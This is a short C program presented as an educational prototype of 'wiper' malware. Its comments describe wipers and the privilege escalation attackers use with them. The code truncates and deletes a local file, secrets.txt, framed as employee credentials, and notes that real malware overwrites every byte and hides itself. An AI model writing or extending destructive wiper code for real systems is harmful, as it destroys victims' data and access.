#include <stdio.h>
/*
WARNING:THIS WIPER IS INTENDED FOR EDUCATIONAL PURPOSES ONLY.I AM NOT RESPONSIBLE FOR ITS USE OR MODIFICATION FOR MALICIOUS PURPOSES

.What is a wiper? 
It is a type of malware designed to delete files or directories,such as System32 on Windows or root on Linux

.Real-World Threat Context:
In the real world,hackers used to implement Priviledge Escalation and UAC Bypass for performing a successfull deletion of sensitive directores and files

.Prototype Scenario:
In this prototype,our wiper is on same folder as secrets.txt,which contains employers's credentials.Its mission is delete secrets.txt,preventing employees from accessing their internal VPN 
*/ 
int main(){
    FILE *file; //Creating a pointer 
    file = fopen("secrets.txt","wb");//This allow us to write/binary the

    if(file != NULL){
        fputc(0, file);//Overwriting the initial byte. Real malware usually overwrites all bytes
        fclose(file);//Closing the file descriptor before unlinking
    }
    
    
    if ((remove("secrets.txt")) == 0){
        printf("Wiper has done its job");
        return 0;
    }
    else{
        perror("Mission failed"); //Obviously,this a prototype.Good wipers dont tell victims their binaries are malware 
        return 1;
    }
    return 0;
}